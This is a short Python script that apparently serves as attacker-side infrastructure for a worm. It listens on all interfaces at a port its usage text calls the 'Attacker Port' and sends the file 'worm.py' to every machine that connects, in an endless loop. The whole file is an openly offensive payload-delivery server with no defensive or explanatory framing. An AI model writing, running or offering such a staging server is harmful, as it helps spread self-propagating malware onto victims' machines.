#!/usr/bin/python3
import socket
import sys

def serve_file(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(10)

    print("Waiting for a connection...")
    client_socket, client_address = server_socket.accept()
    print("Connected to:", client_address)

    file_to_send = "worm.py"

    try:
        with open(file_to_send, "rb") as file:
            for data in file:
                client_socket.sendall(data)
        print("File sent successfully.")
    except IOError:
        print("Error: File not found.")
    client_socket.close()
    server_socket.close()


def main():
    while True:
        serve_file("0.0.0.0", int(sys.argv[1]))


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {__file__} <Attacker Port>")
        exit(1)
    main()
